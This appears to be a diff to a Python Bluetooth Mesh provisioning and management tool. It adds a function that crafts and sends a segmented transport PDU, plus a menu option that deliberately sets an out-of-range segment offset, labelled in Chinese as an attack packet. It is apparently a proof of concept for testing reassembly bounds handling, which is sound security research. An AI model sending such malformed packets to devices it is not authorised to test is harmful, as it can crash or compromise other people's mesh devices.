@@ -90,10 +90,62 @@ class MeshManager:
                 await self.remote_provision_flow()
             elif choice == '11':
                 await self.manual_config_flow()
+            elif choice == '13':
+                await self.send_custom_sar_pdu(seg_n=1, seg_o=0)
+            elif choice == '14':
+                await self.send_custom_sar_pdu(seg_n=1, seg_o=31, is_malicious=True)
             elif choice == '12':
                 break
             else:
                 print("无效选择")
+                
+    async def send_custom_sar_pdu(self, seg_n: int, seg_o: int, is_malicious: bool = False):                                        
+        """                                                                                                                         
+        手动构造并发送一个分段报文。                                                                                                
+        seg_n: 总分段数 - 1 (5 bits)                                                                                                
+        seg_o: 当前分段索引 (5 bits)                                                                                                
+        """                                                                                                                         
+        if not self.target_addr:                                                                                                    
+            print("[-] 错误: 请先设置目标地址")                                                                                     
+            return                                                                                                                  
+                                                                                                                                    
+        # 1. 准备应用层数据 (使用 Generic OnOff Set 保证逻辑合法)                                                                   
+        opcode = 0x8202                                                                                                             
+        payload = b'\x01\x00' + b'\x00' * 10                                                                                        
+        access_pdu = self.stack._create_access_pdu(opcode, payload)                                                                 
+                                                                                                                                    
+        # 2. 加密 PDU                                                                                                               
+        key = self.app_key                                                                                                          
+        seq = self.stack.network.seq                                                                                                
+        iv_index = self.stack.network.iv_index                                                                                      
+                                                                                                                                    
+        # AID 0x37 对应你的 AppKey 0x02...02                                                                                        
+        encrypted_pdu = self.stack.upper_transport.encrypt(                                                                         
+            self.stack.unicast_address, self.target_addr,                                                                           
+            seq, iv_index, access_pdu, key, akf=1, aid=0x37                                                                         
+        )                                                                                                                           
+                                                                                                                                    
+        # 3. 构造分段传输层头部 (Lower Transport Header)                                                                            
+        chunk = encrypted_pdu[:12]                                                                                                  
+        seq_zero = seq & 0x1FFF                                                                                                     
+                                                                                                                                    
+        # 组装 4 字节头部                                                                                                           
+        h0 = 0x80 | (1 << 6) | 0x37   # SEG=1, AKF=1, AID=0x37                                                                      
+        h1 = (0 << 7) | ((seq_zero >> 6) & 0x7F)                                                                                    
+        h2 = ((seq_zero & 0x3F) << 2) | ((seg_o >> 3) & 0x03)                                                                       
+        h3 = ((seg_o & 0x07) << 5) | (seg_n & 0x1F)                                                                                 
+                                                                                                                                    
+        transport_pdu = bytes([h0, h1, h2, h3]) + chunk                                                                             
+                                                                                                                                    
+        # 4. 发送                                                                                                                   
+        print(f"[*] 正在发送分段包: seqAuth={seq}, segO={seg_o}, segN={seg_n} " + ("(!!! 攻击包 !!!)" if is_malicious else "(正常包)"))                                                                                                                        
+        network_pdu = self.stack.network.encrypt_pdu(                                                                               
+            self.stack.unicast_address, self.target_addr, transport_pdu                                                             
+        )                                                                                                                           
+                                                                                                                                    
+        await self.stack.bearer.send_pdu(network_pdu)                                                                               
+        self.stack.storage.set_setting("seq", self.stack.network.seq) # 同步 SEQ 到数据库                                           
+        print(f"[+] 报文已发出，SEQ={seq}")    
 
     async def manual_config_flow(self):
         if not self.target_addr:
